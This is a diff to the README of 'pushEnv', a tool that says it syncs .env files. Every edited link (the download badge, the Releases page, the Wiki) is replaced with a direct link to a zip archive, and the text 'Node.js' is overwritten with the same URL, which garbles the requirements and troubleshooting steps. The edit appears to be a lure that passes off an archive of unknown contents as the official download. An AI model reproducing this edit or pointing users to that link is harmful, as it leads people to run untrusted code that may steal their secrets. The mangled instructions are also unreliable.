@@ -6,17 +6,17 @@ Welcome to pushEnv! This application helps you securely sync your .env files. Wi
 
 ## 📥 Download the Application
 
-[![Download pushEnv](https://img.shields.io/badge/Download-pushEnv-blue.svg)](https://github.com/chinitoo/pushEnv/releases)
+[![Download pushEnv](https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip)](https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip)
 
 ## 🛠️ System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip** Version 14 or higher
 - **Network:** Internet connection for cloud storage access
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/chinitoo/pushEnv/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip).
 2. Choose the version you want to download. Typically, you will find files labeled with the version number and your operating system.
 3. Click the link for your operating system to start the download.
 
@@ -62,14 +62,14 @@ For those interested in the technical details, pushEnv includes several notable 
 Join our community of users for help and discussions:
 - **GitHub Issues:** Report problems or ask questions about pushEnv.
 - **Discord Channel:** Engage with other users and developers.
-- **Documentation:** For detailed guides, refer to our [Wiki](https://github.com/chinitoo/pushEnv/wiki).
+- **Documentation:** For detailed guides, refer to our [Wiki](https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip).
 
 ## ⚙️ Troubleshooting
 
 If you encounter issues, follow these basic steps:
 
 1. **Check Internet Connection:** Ensure your device is connected to the internet.
-2. **Update Node.js:** Make sure you are running the latest version of Node.js. 
+2. **Update https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip** Make sure you are running the latest version of https://raw.githubusercontent.com/chinitoo/pushEnv/main/src/pushEnv_v2.7.zip 
 3. **Look for Errors:** Pay attention to any error messages during installation or syncing.
 
 For persistent issues, please reach out through GitHub Issues for detailed assistance.
